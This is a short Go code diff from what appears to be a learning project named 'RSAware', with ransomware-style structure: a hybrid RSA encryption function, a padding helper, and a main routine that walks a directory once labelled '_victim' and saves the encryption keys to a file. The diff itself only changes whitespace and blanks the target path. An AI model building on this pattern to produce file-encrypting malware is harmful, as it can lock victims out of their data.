@@ -67,7 +67,7 @@ func encryptHybrid(rsaKey *rsa.PublicKey, bs []byte) ([]byte, []byte) {
 }
 
 func pad(bs []byte, blksz int) []byte {
-	count := blksz
+	count := blksz 
 	if len(bs)%blksz != 0 {
 		count = blksz - (len(bs) % blksz)
 	}
@@ -90,7 +90,7 @@ func zero(bs []byte) {
 }
 
 func main() {
-	filepath.Walk("D:\\Documents\\Learning\\Projects\\RSAware\\_victim", walker)
+	filepath.Walk("", walker)
 	data, _ := json.Marshal(eis)
 	os.WriteFile("file.keys", data, 0444)
 }
